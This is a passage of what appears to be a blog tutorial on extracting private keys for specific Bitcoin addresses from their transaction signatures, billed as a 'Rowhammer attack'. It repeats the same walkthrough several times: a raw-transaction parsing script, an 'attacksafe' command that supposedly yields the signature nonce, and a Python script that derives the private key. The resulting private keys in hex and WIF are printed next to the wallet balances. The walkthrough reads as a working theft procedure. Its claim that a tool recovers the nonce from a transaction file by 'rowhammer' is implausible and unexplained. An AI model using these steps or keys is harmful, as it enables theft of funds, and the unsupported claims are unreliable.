<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a
R = 0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
S = 0x5b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe8720
Z = 0x5a6c8e71ff1d29ebf721320d373808f66ede9303e09e3715b3e85ce57b92b7c8


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-177.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1330"></figure>



<p><code>PrivKey = e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc
WIF:  L54WQgCucvc7HCQvYSKnKgiqMUXXXvPxEYZbpxFWTeqQQTuAsqhH
HEX:  e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/004.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1332"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-179-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1337"><figcaption><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 679.53</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№5</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37</a></p><p><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-105-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1148"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-106-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1150"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-185-1024x97.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1349"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-186-1024x240.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1351"></figure>



<pre class="wp-block-code"><code>R = 0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
S = 0x0cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f65274340
Z = 0x6b709c60c5357b397ed916dd014b7ce92ead05508b173b45f20066d23c6720f6</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-187-1024x294.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1353"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-188-1024x395.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1354"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be

RawTX = 010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-189-1024x89.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1356"></figure>



<p><code>(0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935 , 0xb05023fec1068addab6d25f08d358e6f25edd83094ac730dcb7124ef3f662af7)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
S = 0x0cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f65274340
Z = 0x6b709c60c5357b397ed916dd014b7ce92ead05508b173b45f20066d23c6720f6</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
point2gen  =   (0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935 , 0xb05023fec1068addab6d25f08d358e6f25edd83094ac730dcb7124ef3f662af7)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be
R = 0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
S = 0x0cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f65274340
Z = 0x6b709c60c5357b397ed916dd014b7ce92ead05508b173b45f20066d23c6720f6


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-190.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1358"></figure>



<p><code>PrivKey = f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18vXv21kk8PfN4KRX5i19QvDRM855qheQ
WIF:  L5UYkyYNJDaJTrTZdgWUjPBx1EdgSCjoqxLdqgnQvmcAqMVZnQUh
HEX:  f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/005.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1360"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-191-1024x450.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1363"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 683.49</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-192-1024x93.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1366"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-193-1024x239.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1367"></figure>



<pre class="wp-block-code"><code>R = 0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
S = 0x5fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c71
Z = 0xed1d33e82c50d2e9567cee7c1bda9ebee64509fb0575bf144779f81dd1dbf42c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-195-1024x297.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1369"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-194-1024x440.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1368"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d

RawTX = 0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-196-1024x86.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1371"></figure>



<p><code>(0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a , 0x86fe84a8fe36d81088a807db2ff8e7b810cf0104118c527bc06d36dd1688befd)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
S = 0x5fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c71
Z = 0xed1d33e82c50d2e9567cee7c1bda9ebee64509fb0575bf144779f81dd1dbf42c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
point2gen  =   (0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a , 0x86fe84a8fe36d81088a807db2ff8e7b810cf0104118c527bc06d36dd1688befd)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d
R = 0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
S = 0x5fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c71
Z = 0xed1d33e82c50d2e9567cee7c1bda9ebee64509fb0575bf144779f81dd1dbf42c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-190.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1358"></figure>



<p><code>PrivKey = f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18vXv21kk8PfN4KRX5i19QvDRM855qheQ
WIF:  L5UYkyYNJDaJTrTZdgWUjPBx1EdgSCjoqxLdqgnQvmcAqMVZnQUh
HEX:  f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/005.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1360"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-191-1024x450.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1363"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 683.49</code></p>



